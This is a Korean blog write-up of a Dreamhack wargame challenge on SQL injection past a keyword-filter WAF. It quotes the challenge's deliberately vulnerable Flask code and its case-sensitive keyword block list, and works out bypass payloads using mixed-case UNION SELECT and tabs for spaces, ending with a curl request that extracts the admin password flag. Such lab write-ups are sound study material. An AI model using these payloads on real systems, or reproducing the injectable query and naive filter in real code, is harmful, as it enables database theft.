---
title: "드림핵 lv.1 - sql injection bypass WAF"
date: 2025-03-03 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, sql injection, WAF, bypass] 
description: 드림핵 sql injection bypass WAF 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/415/](https://dreamhack.io/wargame/challenges/415/)
# 문제 설명
Exercise: SQL Injection Bypass WAF에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
```
SELECT * FROM user WHERE uid='{uid}';

---

{result}
```
웹사이트에선 특별한 것을 찾아볼 수 없다. <br />
현재 쓰이고 있는 쿼리를 보여주고 있고 해당 쿼리의 결과가 아래 result 부분에 출력되는 것 같다.<br />

그 아래에는 `uid` 값을 입력할 수 있는 인풋 박스와 제출 버튼이 있다. <br />

WAF를 우회하는 문제이기 때문에 아마도 특이한 쿼리를 작성해서 해결해야 할 듯 하다.<br />
테스트용으로 `uid` 값에 `admin`을 입력해보니 WAF에 의해 거절 당했다는 내용이 출력된다.
## 코드 분석
```
[Code Structure]
deploy/
	- app.py
	- init.sql
	- requirements.txt
	- run.sh
DockerFile
```
### init.sql
```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```
예상대로 해당 데이터베이스에는 `admin`이라는 유저가 있고 그의 비밀번호가 플래그이다.
### app.py
```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template
```
유저로부터 값이 들어오면 `check_WAF()` 함수로 먼저 특정 키워드가 쿼리 내에 있는지 확인을 하는 과정이 있다. 
## 최종 풀이
```python
['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
```
우리는 이 키워드들을 우회하여 "admin"이라는 값을 쿼리에 넣어줘야 한다.<br />
### 가능한 쿼리 분석
마지막 문자 3개가 모두 막혀있다. 스페이스바 입력도 못하고 그것을 주석으로 우회할 수도 없다.<br /> 
남은 건 백틱("\`") 뿐이다. 그리고 `uid="admin"`도 안되기 때문에 다른 방법을 생각해야 하는데 나는 `reverse()` 함수를 이용했다. 
```
'||`uid`=reverse("nimda");`--
```
해당 문자열을 입력하면 결과가 나오는데 "admin"으로 나온다. <br />

```python
return template.format(uid=uid, result=result[1])
```
쿼리가 `SELECT *` 를 하고있어서 난 당연히 비밀번호까지 나올 줄 알았는데 코드를 잘 살펴보니 쿼리의 결과값인 result의 1번째 값만 가져오는 것이 보인다. 0번째는 `idx`이고 2번째는 `upw`이다.

결국 `upw` 값을 `uid` 위치에 나오도록 쿼리를 작성해야 하는데 이럴 때 쓰이는 `union` 키워드도 방화벽에 의해 막혀있다.
### 대소문자 판별 문제
생각해보니까 `check_WAF()` 함수를 봤을 때 대소문자를 체크하지 않는 것 같다는 느낌이 들었다. <br />
테스트로 `AdMiN`을 입력해보니 제대로 작동한다. 굳이 `reverse`나 `select`, `union`과 같은 키워드들을 피할 필요가 없는 것이다.

```sql
'`UnION`SeLecT`upw,`uid`FroM`user`WHERE`uid='AdMiN';`--
```
그래서 생각해낸 쿼리는 위와 같다.<br />
하지만 해당 쿼리를 이용하면 `500 internal server error`가 발생한다.

이게 왜 안되는지 이해가 안가서 여러가지를 시도해봤지만 여전히 알아낼 수 없었다.<br />
그래서 해당 문제의 댓글들을 살펴봤다.<br />

해당 웹사이트에서는 요청을 url을 통해서 보내게 되는데 이때 특수 문자가 요청으로 넘어갈 때 `%{num}` 형식으로 넘어가게 된다.<br />
`%{num}`의 '%' 자체가 특수 문자로 또 인식이 돼 한 번 더 인코딩을 거치게 돼서 브라우저로는 해결하기 힘들다는 것을 알아냈다.
### 해결 방법
브라우저가 아닌 다른 방식으로 요청을 보내면 해결된다. 본인은 주로 파이썬으로 요청을 보내는데 이번엔 귀찮아서 그냥 `curl`로 해결하기로 했다.<br />

그리고 추가적으로 "\`" 백틱 사용은 여러 플랫폼이나 서비스에서 특수 문자로 취급하는 경우가 많아 자꾸만 문법 에러가 발생해서 그냥 tab 문자로 대체했다.<br />

쿼리의 또 다른 문제도 발견됐다. <br />
생각해보니 원래의 쿼리에서 3개의 컬럼 값을 가져오는 것을 간과했다. `idx, uid, upw` 값 총 3개를 가져온다. 그래서 `UNION SELECT` 부분에서도 똑같이 3개의 값을 가져와야한다. 

백틱을 탭으로 대체한 것과 수정된 `UNION`이 적용된 쿼리를 인코딩한 최종 URL은 다음과 같다.
```
// uid 값
// 편의를 위해 탭 부분은 스페이스로 대체함
' UnION SeLecT null,upw,null FroM user WHERE uid='AdMiN' --

// 최종 요청 URL
http://host1.dreamhack.games:12944/?uid='%09UnION%09SeLecT%09null,upw,null%09FroM%09user%09WHERE%09uid%3D%27AdMiN%27%3B%09--
```
#### curl execution
```shell
$ curl "http://host1.dreamhack.games:12944/?uid='%09UnION%09SeLecT%09null,upw,null%09FroM%09user%09WHERE%09uid%3D%27AdMiN%27%3B%09--%0A"

<pre style="font-size:200%">SELECT * FROM user WHERE uid=''	UnION	SeLecT	null,upw,null	FroM	user	WHERE	uid='AdMiN';	--
';</pre><hr/>
<pre>DH{REDACTED}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
```
이렇게 해서 `p` 태그 안에 있는 최종 플래그를 얻어낼 수 있다.
# 배운 것
url로 유저 인풋이 들어갈 때 꼭 특수 문자 인코딩에 대해서 염두해두는 것을 잊지 말자.<br />
그리고 ' ' 공백 문자 우회에는 되도록이면 백틱은 지양하자. 이거 때문에 삽질 시간이 늘어났다.